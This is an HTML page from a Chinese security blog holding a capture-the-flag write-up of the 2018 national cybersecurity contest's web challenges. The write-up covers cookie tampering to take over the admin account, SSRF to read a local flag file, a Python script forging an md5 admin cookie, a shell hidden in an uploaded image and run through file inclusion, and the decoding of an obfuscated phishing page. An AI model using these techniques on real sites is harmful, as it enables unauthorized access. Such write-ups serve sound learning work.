<!DOCTYPE html>
<html>
    <!-- title -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="一叶飘零">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="一叶飘零">
    <meta name="keywords" content="Sky's Blog | 一叶飘零">
    <meta name="description" content="苟有恒，何必三更眠五更起。">
    <meta name="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>2018年第四届全国网络空间安全技术大赛 · Sky&#39;s blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s 1;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= /css/style.css?v=20180630 as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= /css/mobile.css?v=20180630 media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >Sky&#39;s blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">2018年第四届全国网络空间安全技术大赛</a>
            </div>
    </div>
    
    <a class="home-link" href=/>Sky's blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style=








height:50vh;

>
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            2018年第四届全国网络空间安全技术大赛
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count">5,589</span> / Reading time: <span class="post-count">29 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2018/05/12</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末抽空做了一下2018全国网络空间安全技术大赛，由于题目难度适中，ak了web，做出了绝大部分的misc和crypto<br>这里特别感谢队友yuriXO对我crypto的极大帮助:)<br>crypto和misc的题目地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/1FSIIbldbBHLNsUFJOaJ8lA 密码: 91v6</span><br></pre></td></tr></table></figure></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>签到题就不解释了<br>flag如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ylng_ying_yin@&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p><a href="http://117.34.117.216" target="_blank" rel="noopener">http://117.34.117.216</a><br>访问后跳转到登录页面<br><a href="http://117.34.117.216/login.php" target="_blank" rel="noopener">http://117.34.117.216/login.php</a><br>发现有注册，随意注册一个账号，登录后<br><img src="/images/2018shanxi (1).jpg"><br>发现要以admin的身份访问flag.php<br>查看源代码，发现还有change_password的功能<br><img src="/images/2018shanxi (2).jpg"><br>同时发现cookie中有username项<br><img src="/images/2018shanxi (3).jpg"><br>猜想可能存在越权问题<br>进入修改密码页面<br><img src="/images/2018shanxi (4).jpg"><br>发现未做username的check<br>猜想直接使用了cookie中的username<br>随机修改cookie中的username为admin<br>同时修改密码<br>成功登入，来到管理页面<br><img src="/images/2018shanxi (5).jpg"><br>发现可以获取远程图片<br>随手测试,发现题目会将远程访问到的页面内容写到本地的图片img目录中<br>尝试访问<br><a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a><br>下载图片文件后获得flag<br><img src="/images/2018shanxi (6).jpg"><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dbf6e52d69973dd16d87d4a8c3816ca9&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>访问题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.34.116.192/index.php?file=login.html</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/2018shanxi (7).jpg"><br>登录尝试发现是伪登录<br>随即想到存在文件包含，尝试读取源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">illgal filename!!</span><br></pre></td></tr></table></figure></p>
<p>发现存在过滤<br>随手测试了一波目录，发现了.git文件泄露<br><img src="/images/2018shanxi (8).jpg"><br>随后下载到源码<br><img src="/images/2018shanxi (9).jpg"><br>此时打开index.php<br><img src="/images/2018shanxi (10).jpg"><br>发现是经过加密的<br>这里有两种解密选择<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.phpjm.cc/</span><br><span class="line">https://github.com/firebroo/screw_decode</span><br></pre></td></tr></table></figure></p>
<p>前者花钱解密，简单快捷<br>后者用工具解密，相对于繁琐一些<br>解密后得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])||<span class="keyword">empty</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">         header(<span class="string">'Refresh:1,url=index.php?file=login.html'</span>);</span><br><span class="line">         <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $file  = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((strpos($file,<span class="string">':'</span>)!==<span class="keyword">false</span>))&#123;</span><br><span class="line">        header(<span class="string">'Refresh:1,url=index.php?file=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"illgal filename!!"</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现只是文件包含<br>再看upload.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Administrator</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminid'</span>]) || <span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminexpire'</span>]) || $_COOKIE[<span class="string">'in_adminexpire'</span>]!==md5($_COOKIE[<span class="string">'in_adminid'</span>].$_COOKIE[<span class="string">'in_adminname'</span>].$_COOKIE[<span class="string">'in_adminpassword'</span>].$_COOKIE[<span class="string">'in_permission'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        setcookie(<span class="string">"in_adminexpire"</span>,$_COOKIE[<span class="string">'in_adminexpire'</span>],time()+<span class="number">1800</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_COOKIE[<span class="string">'in_permission'</span>]))&#123;</span><br><span class="line">            $array=explode(<span class="string">","</span>,$_COOKIE[<span class="string">'in_permission'</span>]);</span><br><span class="line">            $adminlogined=<span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($array);$i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>($array[$i]==$value)&#123;$adminlogined=<span class="keyword">true</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!$adminlogined)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Administrator(<span class="number">2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))&#123;</span><br><span class="line">            $filename = <span class="string">'./img/img'</span>.rand().<span class="string">'.jpg'</span>;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$filename);</span><br><span class="line">            header(<span class="string">'Refresh:3,url=index.php?file=upload.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload $filename Success!"</span>;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">'Refresh:3,url=index.php?file=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Who are you!"</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现可以文件包含，但是要绕过前面的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminid'</span>]) || <span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminexpire'</span>]) || $_COOKIE[<span class="string">'in_adminexpire'</span>]!==md5($_COOKIE[<span class="string">'in_adminid'</span>].$_COOKIE[<span class="string">'in_adminname'</span>].$_COOKIE[<span class="string">'in_adminpassword'</span>].$_COOKIE[<span class="string">'in_permission'</span>]))</span><br></pre></td></tr></table></figure></p>
<p>随即构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(a)</span>:</span></span><br><span class="line">    b = hashlib.md5(a).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">in_adminid=<span class="string">'1'</span></span><br><span class="line">in_adminname=<span class="string">'admin'</span></span><br><span class="line">in_adminpassword=<span class="string">'admin'</span></span><br><span class="line">in_permission=<span class="string">'2'</span></span><br><span class="line">in_adminexpire=md5(in_adminid+in_adminname+in_adminpassword+in_permission)</span><br><span class="line"><span class="keyword">print</span> in_adminexpire</span><br></pre></td></tr></table></figure></p>
<p>利用cookieedit更改cookie，即可来到上传页面<br><img src="/images/2018shanxi (11).jpg"><br>上传一个带shell的jpg图片<br><img src="/images/2018shanxi (12).jpg"><br>得到文件位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upload ./img/img9545545.jpg Success!</span><br></pre></td></tr></table></figure></p>
<p>然后利用文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.34.116.192/index.php?file=./img/img9545545.jpg</span><br></pre></td></tr></table></figure></p>
<p>菜刀连接上<br><img src="/images/2018shanxi (13).jpg"><br>下载f14g.php<br>发现依旧是加密过的，还是用上述方法解密<br>即可得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">""</span>;<span class="comment">//flag&#123;7cb3d823105433606ccac8fb75aed67c&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p><a href="http://45.76.49.10:8001" target="_blank" rel="noopener">http://45.76.49.10:8001</a><br>挺有意思的一题，题目应该来源一个真实事件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从钓鱼样本到某大厂存储型XSS</span><br><span class="line">https://xz.aliyun.com/t/2322</span><br></pre></td></tr></table></figure></p>
<p>用PC点开链接会直接跳转到正版的QQ空间<br>所以这里需要抓包，不难发现跳转到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.76.49.10:8001/0b10813e85c20b58a023440d9f58d7e2</span><br></pre></td></tr></table></figure></p>
<p>然后发现内容(过多，给出部分)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="built_in">decodeURIComponent</span>(arcfour(<span class="string">"36a9dc5d29d54b46793d0c682298dbab"</span>,base64_decode(<span class="string">"EzOR925j1QH2xcQc8Tr9x4GfY2UQ/pt8qa6HxeqOo2WBlyxX36pUO4BZcYkzAbOBWHIVSQiE5fH+LMw4MB/kAFyW7hlMZEWJSoJ7agQOOE3G8GWZuKepUs7z4bia/iXPIPicedfmKpk7VIC+axY+HKCwxCCN9jTJo5kC9d8KTGR/xLgz1a1/7I1cBFdwcuuYPtlHcWjDagXWwN0z25MJgq4ZDViT+x+YkilDwwwzOvqesH/LleYn9PMnE00QvrijCo99j/HAvmMPEVJGDADMt+zowRvcQHeehw/ATQ8/K0vOaqqxf4P1uZKDNOnFDTlt6ijtyuGFTrVHQfru3pErTsEoHOrjHj6sHyBA0xZEC1j3wVM4kW1OKZWYBhRNqHUvcz6Tc7tdjwmkqcaEW71NTXxBF4D8zjJoe8qJeGXvo8qSpWJV/4tYLHI3x90dNV9T53CqeyNYmYE995ozzaN8Wwjqt+YthltVTfqBTkE43HX64V0F3Itqvx0QRtzKWjdxwtc5IibTqjuL0JDlrsHLzOIv51qGH9JvgqrE5Y9jZhQoICCUIlgbyKoYuQJvN8Z2yArywMsY4iiU1jG5lI+BvaYS2BK6INwtRdLKYlDn80yKkq3XPFRsloM1KfxS9DQ/a5euUOf/LB91m72PG4p5GRH+kl/fW9OAdJWoXeA4tJpKntxrGonGfS4QAk8ne5JrHCJHqAKHVuyEqeYhHimkhB9bUtDaZJBG8kDwKaiT7cjCHaxJouLo9S5lVGPIUlIQNusMaLAvC6SaIDk4iY50uXdR2mVBouB+g+/pCbK5oTYvxnqrljqti9McqPNGk5AeLPKZzH</span></span><br><span class="line"><span class="string">.....</span></span><br></pre></td></tr></table></figure></p>
<p>是加密后的内容<br>在密文最后可以发现解密函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.title = <span class="string">'\u624b\u673a\u7edf\u4e00\u767b\u5f55'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(set);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_encode</span>(<span class="params">d</span>)</span>&#123;<span class="keyword">var</span> q=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;<span class="keyword">var</span> z,y,x,w,v,u,t,s,i=<span class="number">0</span>,j=<span class="number">0</span>,p=<span class="string">''</span>,r=[];<span class="keyword">if</span>(!d)&#123;<span class="keyword">return</span> d&#125;<span class="keyword">do</span>&#123;z=d.charCodeAt(i++);y=d.charCodeAt(i++);x=d.charCodeAt(i++);s=z&lt;&lt;<span class="number">16</span>|y&lt;&lt;<span class="number">8</span>|x;w=s&gt;&gt;<span class="number">18</span>&amp;<span class="number">0x3f</span>;v=s&gt;&gt;<span class="number">12</span>&amp;<span class="number">0x3f</span>;u=s&gt;&gt;<span class="number">6</span>&amp;<span class="number">0x3f</span>;t=s&amp;<span class="number">0x3f</span>;r[j++]=q.charAt(w)+q.charAt(v)+q.charAt(u)+q.charAt(t)&#125;<span class="keyword">while</span>(i&lt;d.length);p=r.join(<span class="string">''</span>);<span class="keyword">var</span> r=d.length%<span class="number">3</span>;<span class="keyword">return</span>(r?p.slice(<span class="number">0</span>,r<span class="number">-3</span>):p)+<span class="string">'==='</span>.slice(r||<span class="number">3</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base64_decode</span>(<span class="params">d</span>)</span>&#123;<span class="keyword">var</span> q=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;<span class="keyword">var</span> z,y,x,w,v,u,t,s,i=<span class="number">0</span>,j=<span class="number">0</span>,r=[];<span class="keyword">if</span>(!d)&#123;<span class="keyword">return</span> d&#125;d+=<span class="string">''</span>;<span class="keyword">do</span>&#123;w=q.indexOf(d.charAt(i++));v=q.indexOf(d.charAt(i++));u=q.indexOf(d.charAt(i++));t=q.indexOf(d.charAt(i++));s=w&lt;&lt;<span class="number">18</span>|v&lt;&lt;<span class="number">12</span>|u&lt;&lt;<span class="number">6</span>|t;z=s&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>;y=s&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>;x=s&amp;<span class="number">0xff</span>;<span class="keyword">if</span>(u==<span class="number">64</span>)&#123;r[j++]=<span class="built_in">String</span>.fromCharCode(z)&#125;<span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">64</span>)&#123;r[j++]=<span class="built_in">String</span>.fromCharCode(z,y)&#125;<span class="keyword">else</span>&#123;r[j++]=<span class="built_in">String</span>.fromCharCode(z,y,x)&#125;&#125;<span class="keyword">while</span>(i&lt;d.length);<span class="keyword">return</span> r.join(<span class="string">''</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arcfour</span>(<span class="params">k,d</span>)</span>&#123;<span class="keyword">var</span> o=<span class="string">''</span>;s=<span class="keyword">new</span> <span class="built_in">Array</span>();<span class="keyword">var</span> n=<span class="number">256</span>;l=k.length;<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;s[i]=i&#125;<span class="keyword">for</span>(<span class="keyword">var</span> j=i=<span class="number">0</span>;i&lt;n;i++)&#123;j=(j+s[i]+k.charCodeAt(i%l))%n;<span class="keyword">var</span> x=s[i];s[i]=s[j];s[j]=x&#125;<span class="keyword">for</span>(<span class="keyword">var</span> i=j=y=<span class="number">0</span>;y&lt;d.length;y++)&#123;i=(i+<span class="number">1</span>)%n;j=(j+s[i])%n;x=s[i];s[i]=s[j];s[j]=x;o+=<span class="built_in">String</span>.fromCharCode(d.charCodeAt(y)^s[(s[i]+s[j])%n])&#125;<span class="keyword">return</span> o&#125;</span><br></pre></td></tr></table></figure></p>
